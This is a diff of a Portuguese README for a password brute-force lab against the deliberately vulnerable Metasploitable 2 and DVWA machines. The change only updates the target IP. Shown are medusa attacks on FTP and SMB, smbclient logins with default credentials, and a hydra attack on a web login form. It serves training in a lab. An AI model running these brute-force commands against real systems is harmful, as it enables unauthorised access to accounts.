@@ -17,7 +17,7 @@ Os testes são realizados em máquinas virtuais vulneráveis, como **Metasploita
 * **Kali Linux** → Máquina atacante
 * **Metasploitable 2** → Máquina alvo
 
-  * IP: `192.168.56.1`
+  * IP: `192.168.1.100`
   * Usuário: `msfadmin`
   * Senha: `msfadmin`
 
@@ -29,7 +29,7 @@ Antes de iniciar os ataques, verifique a comunicação entre as máquinas:
 
 ```bash
 ifconfig
-ping 192.168.56.1
+ping 192.168.1.100
 ```
 
 ---
@@ -53,13 +53,13 @@ echo "msfadmin" > passwords.txt
 ### 🔑 Ataque em FTP
 
 ```bash
-medusa -h 192.168.56.1 -u msfadmin -P passwords.txt -M ftp
+medusa -h 192.168.1.100 -u msfadmin -P passwords.txt -M ftp
 ```
 
 Ou utilizando lista de usuários:
 
 ```bash
-medusa -h 192.168.56.1 -U users.txt -P passwords.txt -M ftp
+medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp
 ```
 
 ---
@@ -67,7 +67,7 @@ medusa -h 192.168.56.1 -U users.txt -P passwords.txt -M ftp
 ### 📁 Ataque em SMB
 
 ```bash
-medusa -h 192.168.56.1 -U users.txt -P passwords.txt -M smbnt
+medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M smbnt
 ```
 
 ---
@@ -77,8 +77,8 @@ medusa -h 192.168.56.1 -U users.txt -P passwords.txt -M smbnt
 Após encontrar credenciais válidas:
 
 ```bash
-smbclient -L //192.168.56.1 -U msfadmin
-smbclient //192.168.56.1/tmp -U msfadmin
+smbclient -L //192.168.1.100 -U msfadmin
+smbclient //192.168.1.100/tmp -U msfadmin
 ```
 
 ---
@@ -86,7 +86,7 @@ smbclient //192.168.56.1/tmp -U msfadmin
 ### 🌍 Ataque em Formulário Web (DVWA)
 
 ```bash
-hydra -L users.txt -P passwords.txt 192.168.56.1 http-post-form "/dvwa/login.php\:username=^USER^&password=^PASS^&Login=Login"
+hydra -L users.txt -P passwords.txt 192.168.1.100 http-post-form "/dvwa/login.php\:username=^USER^&password=^PASS^&Login=Login"
 ```
 
 ---
